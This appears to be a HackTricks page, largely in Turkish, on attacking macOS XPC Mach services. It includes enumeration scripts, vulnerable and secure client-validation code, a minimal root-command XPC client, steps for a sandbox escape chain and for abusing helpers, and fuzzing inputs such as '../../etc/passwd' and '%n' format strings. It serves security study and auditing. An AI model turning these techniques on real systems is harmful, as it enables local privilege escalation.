# macOS XPC Mach Services İstismarı

{{#include ../../../banners/hacktricks-training.md}}

## Temel Bilgiler

**XPC** (Süreçler Arası İletişim) macOS'ta birincil IPC mekanizmasıdır. Sistem daemon'ları `launchd` ile kaydedilmiş adlandırılmış portlar olan **Mach services**'i açığa çıkarır; diğer süreçler bunlara `NSXPCConnection` ile bağlanabilir.

Her `MachServices` anahtarına sahip bir **LaunchDaemon** veya **LaunchAgent** plist'i bir veya daha fazla adlandırılmış Mach portu kaydeder. Bunlar sistem çapında XPC uç noktalarıdır ve herhangi bir süreç bunlara bağlanmayı deneyebilir.

> [!WARNING]
> XPC Mach services are the **single largest local privilege escalation attack surface** on macOS. Most local root exploits in recent years went through vulnerable XPC services in LaunchDaemons. Every exposed method in a root daemon is a potential escalation vector.

### Mimari
```
Client Process (user context)
↓ NSXPCConnection / xpc_connection_create_mach_service()
↓ Mach message via launchd
Daemon Process (root context)
↓ Receives XPC message
↓ (Should verify client identity / entitlements)
↓ Performs privileged operation
```
## Enumeration

### Mach Services ile Daemons Bulma
```bash
# Find all LaunchDaemons with MachServices
find /Library/LaunchDaemons /System/Library/LaunchDaemons -name "*.plist" -exec sh -c '
plutil -p "{}" 2>/dev/null | grep -q "MachServices" && echo "{}"
' \; 2>/dev/null

# List active Mach services
sudo launchctl dumpstate 2>/dev/null | grep -E "name = " | sort -u | head -50

# List all launchd services
launchctl list

# Check a specific daemon's Mach services
plutil -p /Library/LaunchDaemons/com.example.daemon.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, e.privileged, e.isDaemon
FROM executables e
WHERE e.isDaemon = 1
ORDER BY e.privileged DESC
LIMIT 50;"
```
### XPC Arayüzlerini Listeleme

Bir daemon'ı belirledikten sonra, XPC arayüzünü tersine mühendislikle analiz edin:
```bash
# Find the protocol definition in the binary
strings /path/to/daemon | grep -i "protocol\|interface\|xpc\|method"

# Use class-dump to extract ObjC protocol definitions
class-dump /path/to/daemon | grep -A20 "@protocol"

# Check for XPC service bundles inside app bundles
find /Applications -path "*/XPCServices/*.xpc" 2>/dev/null
```
## XPC İstemci Doğrulama Güvenlik Açıkları

XPC servislerindeki en yaygın güvenlik açığı sınıfı **yetersiz istemci doğrulamasıdır**. daemon şunu doğrulamalıdır:

1. Bağlanan sürecin **Code signature**
2. Bağlanan sürecin **Entitlements**
3. Bağlanan sürecin **Audit token** (PID değil; yeniden kullanılabilir)

### Güvenliğe Açık Desen: Doğrulama Yok
```objc
// VULNERABLE — daemon accepts any connection
- (BOOL)listener:(NSXPCListener *)listener
shouldAcceptNewConnection:(NSXPCConnection *)newConnection {
newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(MyProtocol)];
newConnection.exportedObject = self;
[newConnection resume];
return YES; // No verification!
}
```
### Kırılgan Desen: PID-Based Verification (Race Condition)
```objc
// VULNERABLE — PID can be reused between check and use
- (BOOL)listener:(NSXPCListener *)listener
shouldAcceptNewConnection:(NSXPCConnection *)newConnection {
pid_t pid = newConnection.processIdentifier;
// Attacker can win race: spawn legitimate process → get PID → kill it → exploit process reuses PID
if ([self isAuthorizedPID:pid]) {
[newConnection resume];
return YES;
}
return NO;
}
```
### Güvenli Desen: Audit Token Doğrulama
```objc
// SECURE — Uses audit token which cannot be spoofed
- (BOOL)listener:(NSXPCListener *)listener
shouldAcceptNewConnection:(NSXPCConnection *)newConnection {
audit_token_t token = newConnection.auditToken;

// Verify code signature via audit token
SecCodeRef code = NULL;
NSDictionary *attributes = @{(__bridge NSString *)kSecGuestAttributeAudit:
[NSData dataWithBytes:&token length:sizeof(token)]};
SecCodeCopyGuestWithAttributes(NULL, (__bridge CFDictionaryRef)attributes,
kSecCSDefaultFlags, &code);

// Verify the signature matches expected signing identity
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(
CFSTR("identifier \"com.apple.expected\" and anchor apple"),
kSecCSDefaultFlags, &requirement);

OSStatus status = SecCodeCheckValidity(code, kSecCSDefaultFlags, requirement);
if (status == errSecSuccess) {
[newConnection resume];
return YES;
}
return NO;
}
```
## Saldırı: Korumasız XPC Servislerine Bağlanma
```objc
// Minimal XPC client — connect to a LaunchDaemon's Mach service
#import <Foundation/Foundation.h>

@protocol VulnDaemonProtocol
- (void)runCommandAsRoot:(NSString *)command withReply:(void (^)(NSString *))reply;
@end

int main(void) {
@autoreleasepool {
NSXPCConnection *conn = [[NSXPCConnection alloc]
initWithMachServiceName:@"com.example.vulndaemon"
options:NSXPCConnectionPrivileged];

conn.remoteObjectInterface = [NSXPCInterface
interfaceWithProtocol:@protocol(VulnDaemonProtocol)];

[conn resume];

id<VulnDaemonProtocol> proxy = [conn remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"Connection error: %@", error);
}];

// If the daemon doesn't verify our identity, this works:
[proxy runCommandAsRoot:@"id" withReply:^(NSString *result) {
NSLog(@"Result: %@", result);
// Output: uid=0(root)
}];

[[NSRunLoop currentRunLoop] run];
}
}
```
## Saldırı: XPC Object Deserialization

Karmaşık nesneleri (`NSSecureCoding` uyumlu) kabul eden XPC servisleri **deserialization attacks** açısından savunmasız olabilir:
```objc
// If the daemon accepts NSObject subclasses via XPC:
// An attacker can send a crafted object that triggers:
// 1. Type confusion (wrong class instantiated)
// 2. Path traversal (filename objects with ../)
// 3. Format string bugs (string objects as format arguments)
// 4. Integer overflow (large numeric values)
```
## Mach-Lookup Sandbox Exceptions

### How Exceptions Enable Sandbox Escape

Sandboxed uygulamalar normalde yalnızca kendi XPC hizmetleriyle iletişim kurabilir. Ancak, **mach-lookup exceptions** sistem genelindeki hizmetlere ulaşmayı sağlar:
```xml
<!-- Entitlement granting mach-lookup exception -->
<key>com.apple.security.temporary-exception.mach-lookup.global-name</key>
<array>
<string>com.apple.system.opendirectoryd.api</string>
<string>com.apple.SecurityServer</string>
<string>com.apple.CoreServices.coreservicesd</string>
</array>
```
### Geniş İstisnaları Olan Uygulamaları Bulma
```bash
# Find sandboxed apps with mach-lookup exceptions
find /Applications -name "*.app" -exec sh -c '
binary="$1/Contents/MacOS/$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)"
[ -f "$binary" ] && {
ents=$(codesign -d --entitlements - "$binary" 2>&1)
echo "$ents" | grep -q "mach-lookup" && {
echo "=== $(basename "$1") ==="
echo "$ents" | grep -B1 -A10 "mach-lookup"
}
}
' _ {} \; 2>/dev/null
```
### Sandbox Escape Chain
```
1. Compromise sandboxed app (e.g., via renderer exploit in browser/email)
2. Enumerate mach-lookup exceptions from entitlements
3. Connect to each reachable system daemon
4. Fuzz the daemon's XPC interface for vulnerabilities
5. Exploit a daemon bug → code execution outside the sandbox
6. Escalate from daemon's privilege level (often root)
```
## Ayrıcalıklı Yardımcı Araçlar (SMJobBless)

### Nasıl Çalışırlar

`SMJobBless` launchd aracılığıyla root olarak çalışan ayrıcalıklı bir yardımcı kurar. Yardımcı, ebeveyn uygulamasıyla XPC üzerinden iletişim kurar:
```
App (user context) ←→ XPC ←→ Helper (root via launchd)
```
### Yaygın Zafiyet: Zayıf Yetkilendirme
```objc
// Many helpers check authorization but:
// 1. Don't verify WHO is connecting (any process can connect)
// 2. Use rights that any admin can obtain
// 3. Cache authorization decisions

// VULNERABLE helper pattern:
- (void)performPrivilegedAction:(NSString *)action
authorization:(NSData *)authData
withReply:(void (^)(BOOL))reply {
AuthorizationRef auth;
AuthorizationCreateFromExternalForm(
(AuthorizationExternalForm *)authData.bytes, &auth);

// Only checks if caller has generic admin right
// But doesn't verify the caller is the app that installed the helper!
AuthorizationItem item = {kAuthorizationRightExecute, 0, NULL, 0};
AuthorizationRights rights = {1, &item};

if (AuthorizationCopyRights(auth, &rights, NULL,
kAuthorizationFlagDefaults, NULL) == errAuthorizationSuccess) {
// Performs action as root...
reply(YES);
}
}
```
### Zayıf Yardımcıları Sömürme
```bash
# 1. Find installed privileged helpers
ls /Library/PrivilegedHelperTools/

# 2. Find their LaunchDaemon plists
ls /Library/LaunchDaemons/ | grep -v "com.apple"

# 3. Check the helper's XPC interface
class-dump /Library/PrivilegedHelperTools/com.example.helper | grep -A20 "@protocol"

# 4. Check if the parent app properly verifies connections
strings /Library/PrivilegedHelperTools/com.example.helper | grep -i "codesign\|requirement\|anchor\|audit"
# If no code-signing verification strings → likely vulnerable
```
## XPC Fuzzing
```bash
# Basic XPC fuzzing approach:

# 1. Identify the target service and protocol
plutil -p /Library/LaunchDaemons/com.example.daemon.plist
class-dump /path/to/daemon

# 2. For each exposed method, test:
#    - NULL arguments
#    - Empty strings
#    - Very long strings (buffer overflow)
#    - Path traversal strings (../../etc/passwd)
#    - Format strings (%n%n%n%n)
#    - Integer boundary values (INT_MAX, -1, 0)
#    - Unexpected object types (send NSDictionary where NSString expected)

# 3. Monitor for crashes
log stream --predicate 'process == "daemon-name" AND (eventMessage CONTAINS "crash" OR eventMessage CONTAINS "fault")'
```
## Gerçek Dünya CVE'leri

| CVE | Açıklama |
|---|---|
| CVE-2023-41993 | XPC servisi deserializasyon zafiyeti |
| CVE-2022-22616 | XPC servisinin kötüye kullanımıyla Gatekeeper atlatma |
| CVE-2021-30657 | Sysmond XPC ayrıcalık yükseltmesi |
| CVE-2020-9839 | system daemon'daki XPC yarış koşulu |
| CVE-2019-8802 | Ayrıcalıklı helper aracında istemci doğrulamasının eksik olması |
| CVE-2023-32369 | Migraine — `systemmigrationd` XPC üzerinden SIP atlatma |
| CVE-2022-26712 | PackageKit XPC root ayrıcalık yükseltmesi |

## Enumeration Script
```bash
#!/bin/bash
echo "=== XPC Mach Services Security Audit ==="

echo -e "\n[*] Third-party privileged helpers:"
for helper in /Library/PrivilegedHelperTools/*; do
[ -f "$helper" ] || continue
echo "  $helper"
codesign -dvv "$helper" 2>&1 | grep "Authority\|TeamIdentifier" | sed 's/^/    /'
done

echo -e "\n[*] Third-party LaunchDaemons with MachServices:"
for plist in /Library/LaunchDaemons/*.plist; do
plutil -p "$plist" 2>/dev/null | grep -q "MachServices" && {
echo "  $plist"
plutil -p "$plist" | grep -A5 "MachServices" | sed 's/^/    /'
}
done

echo -e "\n[*] User LaunchAgents with MachServices:"
for plist in ~/Library/LaunchAgents/*.plist; do
plutil -p "$plist" 2>/dev/null | grep -q "MachServices" && {
echo "  $plist"
plutil -p "$plist" | grep -A5 "MachServices" | sed 's/^/    /'
}
done
```
## Referanslar

* [Apple Developer — XPC Services](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingXPCServices.html)
* [Apple Developer — Daemons and Services Programming Guide](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/Introduction.html)
* [Objective-See — XPC Exploitation](https://objective-see.org/blog.html)
* [OBTS — XPC Attack Surface talks](https://objectivebythesea.org/)

{{#include ../../../banners/hacktricks-training.md}}
